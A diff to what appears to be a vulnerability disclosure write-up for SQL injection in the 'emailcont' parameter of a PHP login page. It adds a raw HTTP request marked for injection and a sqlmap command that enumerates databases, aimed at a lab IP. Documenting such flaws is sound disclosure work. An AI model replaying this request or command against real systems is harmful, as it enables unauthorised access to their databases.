@@ -73,9 +73,32 @@ Parameter: emailcont (POST)
 
 
 ## The following are screenshots of some specific information obtained from testing and running with the sqlmap tool:
+sql.txt:
+
+```
+POST /vms/vpms/users/login.php HTTP/1.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+Cache-Control: max-age=0
+Connection: keep-alive
+Content-Length: 38
+Content-Type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=fts8bkugo602dkngvre7tbqn6t
+Host: 192.168.65.5:8080
+Origin: http://192.168.65.5:8080
+Referer: http://192.168.65.5:8080/vms/vpms/users/login.php
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
+
+emailcont=1234567890*&password=1*&login=
+```
 
 ```
 sqlmap -r sql.txt --batch --risk 3 --level 5 --dbs
+```
+
+![image-20250409135424612](/Users/lingtian/Library/Application%20Support/typora-user-images/image-20250409135424612.png)
 ```
 
 ![](https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250409140515.png)
